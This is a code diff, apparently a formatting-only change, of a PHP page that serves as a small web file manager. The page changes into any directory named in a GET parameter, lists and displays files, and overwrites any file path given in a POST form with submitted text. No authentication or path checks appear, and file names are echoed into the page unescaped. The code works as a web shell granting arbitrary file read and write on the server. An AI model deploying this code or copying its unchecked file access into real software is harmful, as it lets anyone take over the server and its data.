@@ -64,8 +64,9 @@
   <div class="card">
     <div class="card-body">
 <?php
-function alert($msg) {
-  ?>
+function alert($msg)
+{
+    ?>
   <script>
     $(document).ready(function(){
       $("#alert").modal('show');
@@ -81,36 +82,44 @@ function alert($msg) {
   <?php
 }
 if (isset($_GET['x'])) {
-  chdir($_GET['x']);
+    chdir($_GET['x']);
 }
 if (isset($_POST['edit'])) {
-  $handle = fopen($_POST['file'], "w");
-  if (fwrite($handle, $_POST['text'])) {
-    echo alert("success");
-  } else {
-    echo "failed";
-  }
+    $handle = fopen($_POST['file'], "w");
+    if (fwrite($handle, $_POST['text'])) {
+        echo alert("success");
+    } else {
+        echo "failed";
+    }
 }
-function getfiles($cwd, $type) {
-  $dir = scandir($cwd);
-  $result = array();
-  foreach ($dir as $key => $value) {
-    $current['fullname'] = $cwd . DIRECTORY_SEPARATOR . $value;
-    switch ($type) {
-      case 'dir':
-        if (!is_dir($current['fullname']) || $value == '.' || $value == '..') continue 2;
-        break;
-      case 'file':
-        if (!is_file($current['fullname'])) continue 2;
-        break;
-      }
-      $current['name'] = $value;
-      $result[] = $current;
-    } 
-  return $result;
+function getfiles($cwd, $type)
+{
+    $dir = scandir($cwd);
+    $result = [];
+    foreach ($dir as $key => $value) {
+        $current['fullname'] = $cwd . DIRECTORY_SEPARATOR . $value;
+        switch ($type) {
+            case 'dir':
+                if (
+                    !is_dir($current['fullname']) ||
+                    $value == '.' ||
+                    $value == '..'
+                ) {
+                    continue 2;
+                }
+                break;
+            case 'file':
+                if (!is_file($current['fullname'])) {
+                    continue 2;
+                }
+                break;
+        }
+        $current['name'] = $value;
+        $result[] = $current;
+    }
+    return $result;
 }
-foreach (getfiles(getcwd(), "dir") as $key => $dir) {
-  ?>
+foreach (getfiles(getcwd(), "dir") as $key => $dir) { ?>
   <div class="row" style="padding:3px;">
     <div class="col-7">
       <a href="?x=<?= $dir['fullname'] ?>"><?= $dir['name'] ?></a>
@@ -128,10 +137,8 @@ foreach (getfiles(getcwd(), "dir") as $key => $dir) {
       // action
     </div>
   </div>
-  <?php
-}
-foreach (getfiles(getcwd(), 'file') as $key => $file) {
-  ?>
+  <?php }
+foreach (getfiles(getcwd(), 'file') as $key => $file) { ?>
   <div class="row" style="padding:3px;">
     <div class="col-7">
       <?= $file['name'] ?>
@@ -146,12 +153,16 @@ foreach (getfiles(getcwd(), 'file') as $key => $file) {
       // last update
     </div>
     <div class="col">
-      <a href='' class="btn btn-primary btn-sm" data-toggle="modal" data-target="#exampleModalCenter<?= $file['fullname'] ?>">
+      <a href='' class="btn btn-primary btn-sm" data-toggle="modal" data-target="#exampleModalCenter<?= $file[
+          'fullname'
+      ] ?>">
         edit
       </a>
     </div>
   </div>
-    <div class="modal fade" id="exampleModalCenter<?= $file['fullname'] ?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+    <div class="modal fade" id="exampleModalCenter<?= $file[
+        'fullname'
+    ] ?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
       <div class="modal-dialog modal-lg" role="document">
         <div class="modal-content">
           <div class="modal-header">
@@ -192,13 +203,17 @@ foreach (getfiles(getcwd(), 'file') as $key => $file) {
               </tr>
               <tr>
                 <td colspan="3">
-                  <textarea name="text" class="form-control" style="height:200px;resize:none;"><?= htmlspecialchars(file_get_contents($file['fullname'])) ?></textarea>
+                  <textarea name="text" class="form-control" style="height:200px;resize:none;"><?= htmlspecialchars(
+                      file_get_contents($file['fullname'])
+                  ) ?></textarea>
                 </td>
               </tr>
               <tr>
                 <td colspan="3">
                   <input style="width:100%;" type="submit" name="edit" class="btn btn-primary" value="Save">
-                  <input type="hidden" name="file" value="<?= $file['fullname'] ?>">
+                  <input type="hidden" name="file" value="<?= $file[
+                      'fullname'
+                  ] ?>">
                 </td>
               </tr>
             </table>
@@ -207,8 +222,7 @@ foreach (getfiles(getcwd(), 'file') as $key => $file) {
         </div>
       </div>
     </div>
-  <?php
-}
+  <?php }
 ?>
 </div>
 </div>
